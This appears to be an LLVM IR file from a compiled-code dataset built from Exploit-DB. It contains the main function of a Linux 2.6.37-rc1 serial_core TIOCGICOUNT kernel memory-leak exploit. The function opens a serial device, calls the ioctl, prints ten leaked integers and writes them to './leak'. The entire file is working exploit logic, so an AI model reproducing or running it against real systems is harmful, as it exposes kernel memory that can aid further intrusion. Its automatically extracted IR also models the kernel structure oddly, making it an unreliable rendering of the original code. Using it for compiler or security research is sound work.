; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_16973.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_16973.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.serial_icounter_struct = type { i32* }

@.str = private unnamed_addr constant [60 x i8] c"[ Linux <= 2.6.37-rc1 serial_core TIOCGICOUNT leak exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [52 x i8] c"[ You need to supply a device name e.g. /dev/ttyS0\0A\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [20 x i8] c"[ Couldn't open %s\0A\00", align 1
@TIOCGICOUNT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [32 x i8] c"[ Problem with ioctl() request\0A\00", align 1
@.str.4 = private unnamed_addr constant [20 x i8] c"[ int leak[%d]: %x\0A\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"./leak\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [39 x i8] c"[ Can't open file to write memory out\0A\00", align 1
@.str.7 = private unnamed_addr constant [37 x i8] c"[ Written %d leaked bytes to ./leak\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.serial_icounter_struct, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str, i64 0, i64 0))
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 2
  br i1 %12, label %13, label %16

13:                                               ; preds = %2
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.1, i64 0, i64 0))
  %15 = call i32 @exit(i32 -1) #3
  unreachable

16:                                               ; preds = %2
  %17 = call i32 @memset(%struct.serial_icounter_struct* %9, i32 0, i32 8)
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = load i32, i32* @O_RDONLY, align 4
  %22 = call i32 (i8*, i32, ...) @open(i8* %20, i32 %21)
  store i32 %22, i32* %6, align 4
  %23 = icmp eq i32 %22, -1
  br i1 %23, label %24, label %30

24:                                               ; preds = %16
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i8* %27)
  %29 = call i32 @exit(i32 -1) #3
  unreachable

30:                                               ; preds = %16
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* @TIOCGICOUNT, align 4
  %33 = call i32 @ioctl(i32 %31, i32 %32, %struct.serial_icounter_struct* %9)
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %38

35:                                               ; preds = %30
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %37 = call i32 @exit(i32 -1) #3
  unreachable

38:                                               ; preds = %30
  %39 = load i32, i32* %6, align 4
  %40 = call i32 @close(i32 %39)
  store i32 0, i32* %8, align 4
  br label %41

41:                                               ; preds = %53, %38
  %42 = load i32, i32* %8, align 4
  %43 = icmp sle i32 %42, 9
  br i1 %43, label %44, label %56

44:                                               ; preds = %41
  %45 = load i32, i32* %8, align 4
  %46 = getelementptr inbounds %struct.serial_icounter_struct, %struct.serial_icounter_struct* %9, i32 0, i32 0
  %47 = load i32*, i32** %46, align 8
  %48 = load i32, i32* %8, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i32, i32* %47, i64 %49
  %51 = load i32, i32* %50, align 4
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0), i32 %45, i32 %51)
  br label %53

53:                                               ; preds = %44
  %54 = load i32, i32* %8, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %8, align 4
  br label %41

56:                                               ; preds = %41
  %57 = load i32, i32* @O_RDWR, align 4
  %58 = load i32, i32* @O_CREAT, align 4
  %59 = or i32 %57, %58
  %60 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0), i32 %59, i32 416)
  store i32 %60, i32* %6, align 4
  %61 = icmp eq i32 %60, -1
  br i1 %61, label %62, label %65

62:                                               ; preds = %56
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.6, i64 0, i64 0))
  %64 = call i32 @exit(i32 -1) #3
  unreachable

65:                                               ; preds = %56
  store i32 0, i32* %8, align 4
  br label %66

66:                                               ; preds = %81, %65
  %67 = load i32, i32* %8, align 4
  %68 = icmp sle i32 %67, 9
  br i1 %68, label %69, label %84

69:                                               ; preds = %66
  %70 = load i32, i32* %6, align 4
  %71 = getelementptr inbounds %struct.serial_icounter_struct, %struct.serial_icounter_struct* %9, i32 0, i32 0
  %72 = load i32*, i32** %71, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i32, i32* %72, i64 %74
  %76 = call i64 @write(i32 %70, i32* %75, i32 4)
  %77 = load i32, i32* %7, align 4
  %78 = sext i32 %77 to i64
  %79 = add nsw i64 %78, %76
  %80 = trunc i64 %79 to i32
  store i32 %80, i32* %7, align 4
  br label %81

81:                                               ; preds = %69
  %82 = load i32, i32* %8, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %8, align 4
  br label %66

84:                                               ; preds = %66
  %85 = load i32, i32* %6, align 4
  %86 = call i32 @close(i32 %85)
  %87 = load i32, i32* %7, align 4
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.7, i64 0, i64 0), i32 %87)
  %89 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(%struct.serial_icounter_struct*, i32, i32) #1

declare dso_local i32 @open(i8*, i32, ...) #1

declare dso_local i32 @ioctl(i32, i32, %struct.serial_icounter_struct*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @write(i32, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
